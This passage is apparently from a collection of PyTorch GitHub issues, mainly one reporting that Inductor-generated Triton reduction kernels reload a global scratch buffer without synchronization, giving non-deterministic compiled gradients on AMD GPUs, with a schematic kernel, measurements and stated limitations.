- torch.linalg.cond

We need to define what output do we want to see for these functions, is it an error or inf/nan?

Tests that are currently disabled:
- `test_norm_extreme_values` (when `ord='nuc' or 2 or -2`)

Related issues:

- [ ] https://github.com/pytorch/pytorch/issues/43567
- [ ] https://github.com/pytorch/pytorch/issues/52633

### Versions

Master branch with either MKL 2022+ or OpenBLAS 0.3.15+

title: [inductor] Generated reduction kernel reloads global scratch written by its own earlier loop with no synchronization, giving non-deterministic gradients
body:
### 🐛 Describe the bug

Inductor generates fused reduction kernels in which one loop stores partial
results to a **global** scratch buffer and a second loop in the **same kernel**
reloads that buffer, with no synchronization between the two loops. Nothing
guarantees that the stores from loop 1 are visible to the waves executing loop 2,
so the reload can read stale or partially-written data. The result is a
compiled backward that returns different input gradients on every call from
fixed inputs and a fixed upstream gradient.

The forward output is bitwise stable. Eager is bitwise stable. Only the compiled
backward moves.

Because it is a race, the observed behaviour depends on wave scheduling. Anything
that perturbs code generation or timing — reordering operations, forcing a graph
break, changing fusion — makes it appear to go away without removing the hazard.
We think that is worth stating explicitly, because it makes the bug easy to
misdiagnose as a scheduling or version artifact.

#### The generated pattern

Schematic, not a verbatim dump — the structure is what matters:

```python
@triton.jit
def triton_red_fused_..._0(in_ptr0, out_ptr0, xnumel, r0_numel, ...):
    # loop 1 — partial results go to a global scratch buffer
    for r0_offset in range(0, r0_numel, R0_BLOCK):
        ...
        tl.store(out_ptr0 + (...), tmp_partial, mask)

    # <-- nothing here

    # loop 2 — reload what loop 1 wrote, same global buffer
    for r0_offset in range(0, r0_numel, R0_BLOCK):
        tmp_reloaded = tl.load(out_ptr0 + (...), mask)
        ...
```

Triton does not analyse global read/write dependencies across loops on any
backend, and discharging that is left to whoever writes the kernel — see
triton-lang/triton#9887. When the kernel author is Inductor, that obligation
falls on Inductor's code generation, and here it is not being met.

### Evidence

Two kernels matching this pattern were identified by hash in the generated
output. Inserting a single `tl.debug_barrier()` before each reload loop, by
patching the Inductor-generated source post-hoc, is the only change between the
two arms below.

Denominator: the harness runs N iterations and the first sets the reference, so
it compares against itself and can never differ. 128 iterations gives 127
comparisons. Each arm is 127 comparisons × 8 GPUs = 1016.

| arm | compiled input gradients changed |
|---|---|
| unmodified source | 127 of 127 on 8 of 8 GPUs (1016 of 1016) |
| recompile of byte-identical source | 127 of 127 on 8 of 8 GPUs (1016 of 1016) |
| one `tl.debug_barrier()` before each reload loop | 0 on 8 of 8 (0 of 1016) |
| eager | 0 on 8 of 8 (0 of 1016) |
| graph break around the fused region | 0 on 8 of 8 (0 of 1016) |

The recompile arm is the control that matters: recompiling unchanged source stays
broken, so the clean arm is not a cache effect or an artifact of recompilation.
The barrier is the only difference between dirty and clean. Inductor and Triton
caches were redirected per arm and per GPU so that no arm could read another
arm's compiled binary.

Relative L2 drift on the affected gradient reaches ~5%. It fires at the same rate
on all eight GPUs on every replay — there is no device lottery here.

### What we have not established

- **We have not checked whether current `main` still emits this pattern.** Our
  measurements are all on a 2.11 build. A 2.12 build in a separate matrix did not
  reproduce, but we never identified a mechanism for that, so we cannot say
  whether it was fixed, or is merely latent there. If this was already addressed,
  pointing us at the change would be the most useful possible answer.
- **We have not measured the cost of the barrier.** We are not proposing an
  unconditional `tl.debug_barrier()` before every cross-loop scratch reload; that
  would be a throughput regression on every backend and we have no numbers for
  it.
- **We have not reproduced this on NVIDIA hardware.** We only have AMD parts. The
  hazard as written is backend-independent, but whether it fires elsewhere is an
  open question we cannot answer.
- **We have not confirmed the pattern appears in production models.** A static
  scan of every Triton kernel Inductor generated for a real transformer-style
  backward flagged 0 of 205 across two shapes, with the scanner qualified in the
  same job against the case that does reproduce. So this is a demonstrated defect
  in a demonstrated reproducer; we are not claiming a known blast radius.
- Single GPU per process, fp32, one shape. Nothing here says anything about
  multi-GPU or bf16.

### What we are asking

Mainly whether the barrier is the right fix at all. The alternative reading is
that the scheduler should not be fusing these two loops into one kernel while
routing the intermediate through global memory, in which case a barrier is
patching over a fusion decision. We would rather hear which one you consider
correct before anyone writes a patch. If it is the barrier, we are happy to do
the work on the codegen change and the benchmarking.

A self-contained reproducer is in progress. The case we measured is third-party
code that we are not able to publish. We can reproduce on request against
anything you would like us to try.


### Error logs

_No response_

### Versions

PyTorch: 2.11.0+rocm7.2
Triton: 3.6.0
HIP: 7.2.26015
GPU: AMD Instinct MI355X (gfx950), 8 per node
OS: Linux

Filing here rather than against the ROCm fork because the code generation path is common and the missing synchronization is in Inductor, not in a backend-specific component. Happy to be redirected.
